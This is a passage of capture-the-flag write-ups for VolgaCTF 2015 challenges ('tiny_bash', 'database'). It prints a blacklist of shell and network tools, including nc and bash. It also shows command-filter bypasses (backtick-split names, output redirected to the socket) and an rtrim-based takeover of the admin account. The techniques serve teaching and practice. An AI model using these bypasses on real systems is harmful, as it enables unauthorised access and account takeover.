0x602190 <commands+80>: 0x00401346      0x00000000      0x0040134b      0x00000000
0x6021a0 <commands+96>: 0x00401350      0x00000000      0x00401354      0x00000000
0x6021b0 <commands+112>:        0x00401358      0x00000000      0x0040135b      0x00000000
0x6021c0 <commands+128>:        0x00401360      0x00000000      0x00401363      0x00000000
0x6021d0 <commands+144>:        0x00401368      0x00000000      0x0040136d      0x00000000
0x6021e0 <commands+160>:        0x00401372      0x00000000      0x00401376      0x00000000
0x6021f0 <commands+176>:        0x00401379      0x00000000      0x0040137e      0x00000000
0x602200 <commands+192>:        0x00401385      0x00000000      0x0040136d      0x00000000
0x602210 <commands+208>:        0x0040138a      0x00000000      0x00401391      0x00000000
0x602220 <commands+224>:        0x00401396      0x00000000      0x0040139b      0x00000000
0x602230 <commands+240>:        0x004013a0      0x00000000      0x004013a5      0x00000000
0x602240 <commands+256>:        0x004013a9      0x00000000      0x00000000      0x00000000
0x602250 <stderr@@GLIBC_2.2.5>: 0xf7dd41c0
```

Looks like an array of commands starting at `0x40131a` and ending with `0x004013a9`, `32` strings in total.

Printing them all with `gdb`:

```bash
gdb-peda$ x/32s 0x0040131a
0x40131a:       "cat"
0x40131e:       "flag"
0x401323:       "txt"
0x401327:       "bash"
0x40132c:       "python"
0x401333:       "sh"
0x401336:       "ls"
0x401339:       "vi"
0x40133c:       "netcat"
0x401343:       "nc"
0x401346:       "perl"
0x40134b:       "args"
0x401350:       "awk"
0x401354:       "sed"
0x401358:       "wc"
0x40135b:       "pico"
0x401360:       "ed"
0x401363:       "echo"
0x401368:       "grep"
0x40136d:       "find"
0x401372:       "bin"
0x401376:       "su"
0x401379:       "sudo"
0x40137e:       "system"
0x401385:       "exec"
0x40138a:       "regexp"
0x401391:       "tail"
0x401396:       "head"
0x40139b:       "less"
0x4013a0:       "more"
0x4013a5:       "cut"
0x4013a9:       "pg"
```

We see a lot of blacklisted commands. However, `id` for example isn't one of them, so we should see the output if we try `id`:


```bash
$ nc localhost 6666
Welcome to our small secure shell.You are disallowed to execute several types ofcommands.Are you able to bypass these restrictions?
>> id
>>
```

Well, we see the output, but on the server side:

```
$ ./tiny_bash 6666
Accepted connection from 127.0.0.1
User request: id

uid=1000(vbox) gid=1000(vbox) groups=1000(vbox),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

So what do we do? Well if you know that after each time you open a socket, you open a file descriptor to be able to communicate between sockets.

There are three [file descriptors](https://en.wikipedia.org/wiki/File_descriptor) for each process by default opened:

* `0`: stdin
* `1`: stdout
* `2`: stderr

If we open a socket and the highest file descriptor number currently is `3`, the new file descriptor gets the number `4`.

You can redirect file descriptors to other file descriptors using `bash`'s [`I/O Redirection`](http://www.tldp.org/LDP/abs/html/io-redirection.html).

E.g. using `2>&4` you redirect `stderr` to our socket connection's file descriptor:

```bash
>> is 2>&4
sh: 1: is: not found
```

All that is left to do is redirect the output, `stdin` or `stderr`, of a non-blacklisted command to our socket.

There are several solutions:

* `du` - List all files:
```bash
>> du * 1>&4
4       this_file_contains_flag_cat_it.txt
16      tiny_bash
```
* `tac`:
```bash
>> tac * >&4
<garbage>{desire_is_the_key_to_motivation}<garbage>
```
* `rev`:
```bash
>> rev * 1>&4
}noitavitom_ot_yek_eht_si_erised{
```
* `xxd`:
```bash
>> xxd th* 1>&4
0000000: 7b64 6573 6972 655f 6973 5f74 6865 5f6b  {desire_is_the_k
0000010: 6579 5f74 6f5f 6d6f 7469 7661 7469 6f6e  ey_to_motivation
0000020: 7d0a                                     }.
```
* `ls` plus `cat` with some bash hacks:
```bash
>> l``s >&4
this_file_contains_flag_cat_it.txt
tiny_bash
>> c``at th* >&4
{desire_is_the_key_to_motivation}
```

There are several solutions to get the flag, `{desire_is_the_key_to_motivation}`.

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <http://www.mrt-prodz.com/blog/view/2015/05/volgactf-2015-quals---bash-125pts-writeup>
* <https://www.whitehatters.academy/volgactf-2015-bash/>
* <http://ww9210.cn/2015/05/04/volgactf-writeupinterstellar-tiny_bash-mathproblem-database-pwnie/>
* [Polish](http://forum.4programmers.net/Spolecznosc/251462-writeup_volgactf_2015)
# VolgaCTF Quals CTF 2015: database

**Category:** Pwn
**Points:** 75
**Solves:** 116
**Description:**

> hack the database!
> 
> nc database.2015.volgactf.ru 7777
> [database](http://files.2015.volgactf.ru/database/database)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/pwn/database>
* <http://www.mrt-prodz.com/blog/view/2015/05/volgactf-2015-quals---database-75pts-writeup>

First, we apply `file` on the given binary to find out what we are dealing with:

```bash
$ file database
database: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=d9a1acedc81f211feef5289d2cb05effd06d4a34, not stripped
```

`x86` Linux, not stripped ELF.

After running the binary, we can connect to it using `nc` with the specified port:

```bash
$ ./database
Usage: database port
$ ./database 7777
[...]
# On another terminal:
$ nc localhost 7777
>> help
Unknown command or incorrect number of parameteres.
^C
```

Ok so the usual `help` does not give us any further information.

Time to look at strings, functions, libraries and other information of this binary by using [`radare2`](https://github.com/radare/radare2) ([Here](https://github.com/pwntester/cheatsheets/blob/master/radare2.md) is a good cheatsheet)!

```bash
$ radare2 ./database
[0x00401010]> iz
[strings]
addr=0x00402038 off=0x00002038 ordinal=000 sz=4 section=.rodata string=
addr=0x00402040 off=0x00002040 ordinal=001 sz=52 section=.rodata string=Unknowncommandorincorrectnumberofparameteres.
addr=0x00402078 off=0x00002078 ordinal=002 sz=47 section=.rodata string=Thiscommandisprohibitedtononadminusers.
addr=0x004020a8 off=0x000020a8 ordinal=003 sz=31 section=.rodata string=Targetuserisnotregistered.
addr=0x004020c8 off=0x000020c8 ordinal=004 sz=27 section=.rodata string=Thepasswordisincorrect.
addr=0x004020e4 off=0x000020e4 ordinal=005 sz=29 section=.rodata string=Thisuserisalreadyexists.
addr=0x00402102 off=0x00002102 ordinal=006 sz=29 section=.rodata string=Youmustbeloggedinfirst
addr=0x00402120 off=0x00002120 ordinal=007 sz=44 section=.rodata string=Thereisnospecificinfoforcurrentuser.
addr=0x00402150 off=0x00002150 ordinal=008 sz=46 section=.rodata string=Youhavetospecifyusersnameandpassword.
addr=0x00402180 off=0x00002180 ordinal=009 sz=41 section=.rodata string=Youhavetospecifycorrectusersinfo.
addr=0x004021aa off=0x000021aa ordinal=010 sz=28 section=.rodata string=Youarenotevenloggedin
addr=0x004021c8 off=0x000021c8 ordinal=011 sz=7 section=.rodata string=adminr
addr=0x004021cf off=0x000021cf ordinal=012 sz=9 section=.rodata string=flag.txt
addr=0x004021d8 off=0x000021d8 ordinal=013 sz=8 section=.rodata string=ss
addr=0x004021e1 off=0x000021e1 ordinal=014 sz=12 section=.rodata string=Youares.
addr=0x004021ee off=0x000021ee ordinal=015 sz=18 section=.rodata string=Newuserarrived
addr=0x00402200 off=0x00002200 ordinal=016 sz=22 section=.rodata string=Failedtoreadsocket
addr=0x00402217 off=0x00002217 ordinal=017 sz=25 section=.rodata string=dfdUserrequests.
addr=0x00402231 off=0x00002231 ordinal=018 sz=9 section=.rodata string=get_flag
addr=0x0040223a off=0x0000223a ordinal=019 sz=7 section=.rodata string=whoami
addr=0x00402241 off=0x00002241 ordinal=020 sz=6 section=.rodata string=login
addr=0x00402247 off=0x00002247 ordinal=021 sz=9 section=.rodata string=register
addr=0x00402250 off=0x00002250 ordinal=022 sz=5 section=.rodata string=exit
addr=0x00402255 off=0x00002255 ordinal=023 sz=9 section=.rodata string=get_info
addr=0x0040225e off=0x0000225e ordinal=024 sz=9 section=.rodata string=set_info
addr=0x00402267 off=0x00002267 ordinal=025 sz=7 section=.rodata string=logout
addr=0x0040226e off=0x0000226e ordinal=026 sz=28 section=.rodata string=Userwithfddhasleft.
addr=0x0040228b off=0x0000228b ordinal=027 sz=21 section=.rodata string=Usagedatabaseport
addr=0x004022a0 off=0x000022a0 ordinal=028 sz=13 section=.rodata string=password.txt
addr=0x004022b0 off=0x000022b0 ordinal=029 sz=37 section=.rodata string=Failedtoopenadminspasswordfile
addr=0x004022d6 off=0x000022d6 ordinal=030 sz=25 section=.rodata string=Failedtoacquiresocket
addr=0x004022f0 off=0x000022f0 ordinal=031 sz=28 section=.rodata string=Setsockoptfunctionfailed.
addr=0x0040230d off=0x0000230d ordinal=032 sz=23 section=.rodata string=Unabletobindsocket.
addr=0x00402325 off=0x00002325 ordinal=033 sz=27 section=.rodata string=Failedtolistenonsocket
addr=0x00402348 off=0x00002348 ordinal=034 sz=40 section=.rodata string=Failedacceptingconnectioncontinuing
addr=0x00402371 off=0x00002371 ordinal=035 sz=28 section=.rodata string=Acceptedconnectionfroms
addr=0x00603150 off=0x00003150 ordinal=000 sz=4 section=.data string=8
addr=0x00603158 off=0x00003158 ordinal=001 sz=4 section=.data string=
addr=0x00603160 off=0x00003160 ordinal=002 sz=4 section=.data string=x
addr=0x00603169 off=0x00003169 ordinal=003 sz=3 section=.data string=
addr=0x00603171 off=0x00003171 ordinal=004 sz=3 section=.data string=
addr=0x00603179 off=0x00003179 ordinal=005 sz=3 section=.data string=
addr=0x00603181 off=0x00003181 ordinal=006 sz=3 section=.data string=
addr=0x00603188 off=0x00003188 ordinal=007 sz=4 section=.data string=
addr=0x00603190 off=0x00003190 ordinal=008 sz=4 section=.data string=P
addr=0x00603199 off=0x00003199 ordinal=009 sz=3 section=.data string=
addr=0x006031a1 off=0x000031a1 ordinal=010 sz=3 section=.data string=

47 strings
```

You can also use a hexeditor e.g. `hexedit` and find argument and other real strings compact in the data segment of the binary:

![](./hexedit.png)

You have to manually find the start of the data segment either by just having a closer look at the binary (usually the `.data` or `.rodata` segment are in the `2/3` to `3/4` section of the binary) or decompiling it using any decompiler and then searching for found strings.

We see some command like strings like `whoami`, `login`, `register` etc and try these:

```bash
$ nc localhost 7777
>> whoami
You are not even logged in!
>> login admin pass
The password is incorrect.
>> register guest pass
>> whoami
You are guest.
>> get_flag
This command is prohibited to non-admin users.
>> get_info
guest : There is no specific info for current user.
admin : profileinformation
```

Looks like we have to login as admin to get the flag!

By either decompiling or using `radare` again, we can see a list of symbols in the symbol table that hold [global variables or functions](https://en.wikipedia.org/wiki/Symbol_table):

```bash
[0x00401010]> is
[Symbols]
addr=0x00602e00 off=0x00202e00 ord=028 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=__JCR_LIST__
addr=0x00401040 off=0x00001040 ord=029 fwd=NONE sz=0 bind=LOCAL type=FUNC name=deregister_tm_clones
addr=0x00401070 off=0x00001070 ord=030 fwd=NONE sz=0 bind=LOCAL type=FUNC name=register_tm_clones
addr=0x004010b0 off=0x000010b0 ord=031 fwd=NONE sz=0 bind=LOCAL type=FUNC name=__do_global_dtors_aux
addr=0x006031b0 off=0x002031b0 ord=032 fwd=NONE sz=1 bind=LOCAL type=OBJECT name=completed.6972
addr=0x00602df8 off=0x00202df8 ord=033 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=__do_global_dtors_aux_fini_array_entry
addr=0x004010d0 off=0x000010d0 ord=034 fwd=NONE sz=0 bind=LOCAL type=FUNC name=frame_dummy
addr=0x00602df0 off=0x00202df0 ord=035 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=__frame_dummy_init_array_entry
addr=0x00402658 off=0x00002658 ord=038 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=__FRAME_END__
addr=0x00602e00 off=0x00202e00 ord=039 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=__JCR_END__
addr=0x00602df8 off=0x00202df8 ord=041 fwd=NONE sz=0 bind=LOCAL type=NOTYPE name=__init_array_end
addr=0x00602e08 off=0x00202e08 ord=042 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=_DYNAMIC
addr=0x00602df0 off=0x00202df0 ord=043 fwd=NONE sz=0 bind=LOCAL type=NOTYPE name=__init_array_start
addr=0x00603000 off=0x00203000 ord=044 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=_GLOBAL_OFFSET_TABLE_
addr=0x00402020 off=0x00002020 ord=045 fwd=NONE sz=2 bind=GLOBAL type=FUNC name=__libc_csu_fini
addr=0x0040168e off=0x0000168e ord=046 fwd=NONE sz=82 bind=GLOBAL type=FUNC name=logout
addr=0x00401174 off=0x00001174 ord=048 fwd=NONE sz=233 bind=GLOBAL type=FUNC name=insert_new_user
addr=0x00603140 off=0x00203140 ord=051 fwd=NONE sz=0 bind=UNKNOWN type=NOTYPE name=data_start
addr=0x00603160 off=0x00203160 ord=052 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=get_flag_prohibited
addr=0x004015b1 off=0x000015b1 ord=053 fwd=NONE sz=221 bind=GLOBAL type=FUNC name=get_info
addr=0x0040125d off=0x0000125d ord=055 fwd=NONE sz=235 bind=GLOBAL type=FUNC name=get_flag
addr=0x006031a8 off=0x002031a8 ord=059 fwd=NONE sz=0 bind=GLOBAL type=NOTYPE name=_edata
addr=0x00603190 off=0x00203190 ord=061 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=no_data
addr=0x00402024 off=0x00002024 ord=063 fwd=NONE sz=0 bind=GLOBAL type=FUNC name=_fini
addr=0x00401348 off=0x00001348 ord=066 fwd=NONE sz=238 bind=GLOBAL type=FUNC name=login
addr=0x006031b8 off=0x002031b8 ord=069 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=users
addr=0x006031a0 off=0x002031a0 ord=073 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=logout_error
addr=0x00603198 off=0x00203198 ord=074 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=no_info_specified
addr=0x004016e0 off=0x000016e0 ord=076 fwd=NONE sz=199 bind=GLOBAL type=FUNC name=whoami
addr=0x00603178 off=0x00203178 ord=079 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=user_exists
addr=0x00603180 off=0x00203180 ord=083 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=no_user
addr=0x00603140 off=0x00203140 ord=084 fwd=NONE sz=0 bind=GLOBAL type=NOTYPE name=__data_start
addr=0x004010fd off=0x000010fd ord=086 fwd=NONE sz=119 bind=GLOBAL type=FUNC name=rtrim
addr=0x00603148 off=0x00203148 ord=088 fwd=NONE sz=0 bind=GLOBAL type=OBJECT name=__dso_handle
addr=0x004014f1 off=0x000014f1 ord=089 fwd=NONE sz=192 bind=GLOBAL type=FUNC name=set_info
addr=0x00402030 off=0x00002030 ord=090 fwd=NONE sz=4 bind=GLOBAL type=OBJECT name=_IO_stdin_used
addr=0x00603170 off=0x00203170 ord=091 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=incorrect_password
addr=0x00603168 off=0x00203168 ord=092 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=user_not_found
addr=0x00401fb0 off=0x00001fb0 ord=093 fwd=NONE sz=101 bind=GLOBAL type=FUNC name=__libc_csu_init
addr=0x00603150 off=0x00203150 ord=094 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=invitation
addr=0x006031c0 off=0x002031c0 ord=096 fwd=NONE sz=0 bind=GLOBAL type=NOTYPE name=_end
addr=0x00401010 off=0x00001010 ord=098 fwd=NONE sz=0 bind=GLOBAL type=FUNC name=_start
addr=0x006031a8 off=0x002031a8 ord=099 fwd=NONE sz=0 bind=GLOBAL type=NOTYPE name=__bss_start
addr=0x00401436 off=0x00001436 ord=100 fwd=NONE sz=187 bind=GLOBAL type=FUNC name=register_user
addr=0x00401be2 off=0x00001be2 ord=101 fwd=NONE sz=971 bind=GLOBAL type=FUNC name=main
addr=0x00603188 off=0x00203188 ord=108 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=no_info
addr=0x00603158 off=0x00203158 ord=109 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=incorrect_command
addr=0x006031a8 off=0x002031a8 ord=113 fwd=NONE sz=0 bind=GLOBAL type=OBJECT name=__TMC_END__
addr=0x00400d90 off=0x00000d90 ord=117 fwd=NONE sz=0 bind=GLOBAL type=FUNC name=_init
addr=0x006031a8 off=0x002031a8 ord=119 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=stderr@@GLIBC_2.2.5
addr=0x004017a7 off=0x000017a7 ord=121 fwd=NONE sz=1083 bind=GLOBAL type=FUNC name=process_connection
addr=0x00400dc0 off=0x00000dc0 ord=001 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.recv
addr=0x00400dd0 off=0x00000dd0 ord=002 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strncpy
addr=0x00400000 off=0x00000000 ord=003 fwd=NONE sz=16 bind=UNKNOWN type=NOTYPE name=imp._ITM_deregisterTMCloneTable
addr=0x00400de0 off=0x00000de0 ord=004 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts
addr=0x00400df0 off=0x00000df0 ord=005 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.setsockopt
addr=0x00400e10 off=0x00000e10 ord=006 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.inet_ntoa
addr=0x00400e20 off=0x00000e20 ord=007 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.fclose
addr=0x00400e30 off=0x00000e30 ord=008 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.g_hash_table_lookup
addr=0x00400e40 off=0x00000e40 ord=009 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strlen
addr=0x00400e50 off=0x00000e50 ord=010 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.__stack_chk_fail
addr=0x00400e60 off=0x00000e60 ord=011 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.htons
addr=0x00400e70 off=0x00000e70 ord=012 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.send
addr=0x00400e80 off=0x00000e80 ord=013 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strchr
addr=0x00400e90 off=0x00000e90 ord=014 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.printf
addr=0x00400ea0 off=0x00000ea0 ord=015 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.snprintf
addr=0x00400eb0 off=0x00000eb0 ord=016 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.memset
addr=0x00400ec0 off=0x00000ec0 ord=017 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.close
addr=0x00400ed0 off=0x00000ed0 ord=018 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.g_hash_table_new
addr=0x00400ee0 off=0x00000ee0 ord=019 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.__libc_start_main
addr=0x00400ef0 off=0x00000ef0 ord=020 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.fgets
addr=0x00400f00 off=0x00000f00 ord=021 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.calloc
addr=0x00400f10 off=0x00000f10 ord=022 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcmp
addr=0x00400f20 off=0x00000f20 ord=023 fwd=NONE sz=16 bind=UNKNOWN type=NOTYPE name=imp.__gmon_start__
addr=0x00400f30 off=0x00000f30 ord=024 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.listen
addr=0x00400f40 off=0x00000f40 ord=025 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.g_hash_table_insert
addr=0x00400f50 off=0x00000f50 ord=026 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.bind
addr=0x00400f70 off=0x00000f70 ord=027 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.fopen
addr=0x00400000 off=0x00000000 ord=028 fwd=NONE sz=16 bind=UNKNOWN type=NOTYPE name=imp._Jv_RegisterClasses
addr=0x00400f80 off=0x00000f80 ord=029 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.accept
addr=0x00400f90 off=0x00000f90 ord=030 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.atoi
addr=0x00400fa0 off=0x00000fa0 ord=031 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.sprintf
addr=0x00400fb0 off=0x00000fb0 ord=032 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.exit
addr=0x00400fc0 off=0x00000fc0 ord=033 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.fwrite
addr=0x00400fd0 off=0x00000fd0 ord=034 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.g_hash_table_lookup_extended
addr=0x00400000 off=0x00000000 ord=035 fwd=NONE sz=16 bind=UNKNOWN type=NOTYPE name=imp._ITM_registerTMCloneTable
addr=0x00400fe0 off=0x00000fe0 ord=036 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.g_hash_table_foreach
addr=0x00400ff0 off=0x00000ff0 ord=037 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.fork
addr=0x00401000 off=0x00001000 ord=038 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.socket
addr=0x00400f60 off=0x00000f60 ord=041 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.g_str_hash
addr=0x00400e00 off=0x00000e00 ord=045 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.g_str_equal

91 symbols
```

Note that this is harder in the case of the ELF being stripped - meaning that this information is removed from the ELF using the tool `strip`.

These functions seem to be interesting:

* `rtrim`
* `insert_new_user`
* `get_flag`
* `login`
* `register_user`
* `set_info`
* `get_info`
* `logout`
* `whoami`
* `process_connection`

Now you can either use `gdb` to debug the binary step by step or decompile the binary using `objdump`, hopper, ida or other decompilers .

While decompiling / reversing the binary these functions become interesting (since they depend on user input):

* `rtrim`
* `insert_new_user`
* `login`
* `register_user`

`rtrim`:

```asm
00000000004010fd <rtrim>:
  4010fd:       55                      push   rbp
  4010fe:       48 89 e5                mov    rbp,rsp
  401101:       48 83 ec 20             sub    rsp,0x20
  401105:       48 89 7d e8             mov    QWORD PTR [rbp-0x18],rdi
  401109:       48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
  40110d:       48 89 c7                mov    rdi,rax
  401110:       e8 2b fd ff ff          call   400e40 <strlen@plt>

  401115:       48 8d 50 ff             lea    rdx,[rax-0x1]
  401119:       48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
  40111d:       48 01 d0                add    rax,rdx
  401120:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  401124:       eb 3e                   jmp    401164 <rtrim+0x67>

  401126:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  40112a:       0f b6 00                movzx  eax,BYTE PTR [rax]
  40112d:       3c 0d                   cmp    al,0xd ; "\r"
  40112f:       74 27                   je     401158 <rtrim+0x5b>

  401131:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  401135:       0f b6 00                movzx  eax,BYTE PTR [rax]
  401138:       3c 0a                   cmp    al,0xa ; "\n"
  40113a:       74 1c                   je     401158 <rtrim+0x5b>

  40113c:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  401140:       0f b6 00                movzx  eax,BYTE PTR [rax]
  401143:       3c 20                   cmp    al,0x20 ; " "
  401145:       74 11                   je     401158 <rtrim+0x5b>

  401147:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  40114b:       0f b6 00                movzx  eax,BYTE PTR [rax]
  40114e:       3c 09                   cmp    al,0x9 ; "\t"
  401150:       74 06                   je     401158 <rtrim+0x5b>

  401152:       48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
  401156:       eb 1a                   jmp    401172 <rtrim+0x75>

  401158:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  40115c:       c6 00 00                mov    BYTE PTR [rax],0x0
  40115f:       48 83 6d f8 01          sub    QWORD PTR [rbp-0x8],0x1
  401164:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  401168:       48 3b 45 e8             cmp    rax,QWORD PTR [rbp-0x18]
  40116c:       73 b8                   jae    401126 <rtrim+0x29>

  40116e:       48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
  401172:       c9                      leave  
  401173:       c3                      ret    
```

`rtrim` strips whitecharacters from a given string - in this case `\n` (`0xa`), ` ` (`0x20`), `\t` (`0x9`) and `\r` (`0xd`).

* `insert_new_user`:

```asm
0000000000401174 <insert_new_user>:
  401174:       55                      push   rbp
  401175:       48 89 e5                mov    rbp,rsp
  401178:       48 83 ec 30             sub    rsp,0x30
  40117c:       48 89 7d e8             mov    QWORD PTR [rbp-0x18],rdi
  401180:       48 89 75 e0             mov    QWORD PTR [rbp-0x20],rsi
  401184:       48 89 55 d8             mov    QWORD PTR [rbp-0x28],rdx
  401188:       be 01 00 00 00          mov    esi,0x1
  40118d:       bf 40 00 00 00          mov    edi,0x40
  401192:       e8 69 fd ff ff          call   400f00 <calloc@plt>

  401197:       48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
  40119b:       48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
  40119f:       48 89 c7                mov    rdi,rax
  4011a2:       e8 56 ff ff ff          call   4010fd <rtrim>

  4011a7:       48 89 c1                mov    rcx,rax
  4011aa:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
  4011ae:       ba 40 00 00 00          mov    edx,0x40
  4011b3:       48 89 ce                mov    rsi,rcx
  4011b6:       48 89 c7                mov    rdi,rax
  4011b9:       e8 12 fc ff ff          call   400dd0 <strncpy@plt>

  4011be:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
  4011c2:       48 83 c0 40             add    rax,0x40
  4011c6:       c6 00 00                mov    BYTE PTR [rax],0x0
  4011c9:       be 01 00 00 00          mov    esi,0x1
  4011ce:       bf 80 00 00 00          mov    edi,0x80
  4011d3:       e8 28 fd ff ff          call   400f00 <calloc@plt>

  4011d8:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  4011dc:       48 8b 45 e0             mov    rax,QWORD PTR [rbp-0x20]
  4011e0:       48 89 c7                mov    rdi,rax
  4011e3:       e8 15 ff ff ff          call   4010fd <rtrim>

  4011e8:       48 89 c1                mov    rcx,rax
  4011eb:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4011ef:       ba 40 00 00 00          mov    edx,0x40
  4011f4:       48 89 ce                mov    rsi,rcx
  4011f7:       48 89 c7                mov    rdi,rax
  4011fa:       e8 d1 fb ff ff          call   400dd0 <strncpy@plt>

  4011ff:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  401203:       c6 40 40 00             mov    BYTE PTR [rax+0x40],0x0
  401207:       48 83 7d d8 00          cmp    QWORD PTR [rbp-0x28],0x0
  40120c:       74 2f                   je     40123d <insert_new_user+0xc9>

  40120e:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  401212:       48 89 c7                mov    rdi,rax
  401215:       e8 e3 fe ff ff          call   4010fd <rtrim>

  40121a:       48 8b 55 f8             mov    rdx,QWORD PTR [rbp-0x8]
  40121e:       48 8d 4a 40             lea    rcx,[rdx+0x40]
  401222:       ba 40 00 00 00          mov    edx,0x40
  401227:       48 89 c6                mov    rsi,rax
  40122a:       48 89 cf                mov    rdi,rcx
  40122d:       e8 9e fb ff ff          call   400dd0 <strncpy@plt>

  401232:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  401236:       c6 80 80 00 00 00 00    mov    BYTE PTR [rax+0x80],0x0
  40123d:       48 8b 05 74 1f 20 00    mov    rax,QWORD PTR [rip+0x201f74]        # 6031b8 <users>
  401244:       48 8b 55 f8             mov    rdx,QWORD PTR [rbp-0x8]
  401248:       48 8b 4d f0             mov    rcx,QWORD PTR [rbp-0x10]
  40124c:       48 89 ce                mov    rsi,rcx
  40124f:       48 89 c7                mov    rdi,rax
  401252:       e8 e9 fc ff ff          call   400f40 <g_hash_table_insert@plt>

  401257:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
  40125b:       c9                      leave  
  40125c:       c3                      ret 
```

To ease the reversing task, you can use reverse engineering tools that produce pseudo C code, such as IDA or hopper (for Objective-C?).

A representation of this pseudo-code can be seen [here](https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/pwn/database).

After having a closer look at how a user is registered, we see that `rtrim` is called several times in `insert_new_user` - once for the username and once for the password.

This means that we can register ourselves with a username that has a tabspace character appended such as `admin\t`.
This username then is trimmed with `rtrim`, becoming `rtrim`, and after that inserted in the database with the new password!

Following that, we just login as `admin` and the new password to call `get_flag` and receive the flag, `{does_it_look_like_column_tr@ncation}`.

To reproduce the exploit, follow these steps:

* `echo -n 'HACK{test_flag_sotesty}' > flag.txt`
* `echo 'admin profileinformation' > password.txt`
* Run the executable with `bash database 7777` in a VM
* Run the [solver script](./solve.py)

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/pwn/database>
* <http://www.mrt-prodz.com/blog/view/2015/05/volgactf-2015-quals---database-75pts-writeup>
* [Japanese](http://sioncojp.hateblo.jp/entry/2015/05/14/035148)
* [Polish](http://forum.4programmers.net/Spolecznosc/251462-writeup_volgactf_2015)
# VolgaCTF Quals CTF 2015: my little pwnie

**Category:** Pwn
**Points:** 250
**Solves:** 23
**Description:**

> Just another pwn task. Break in!
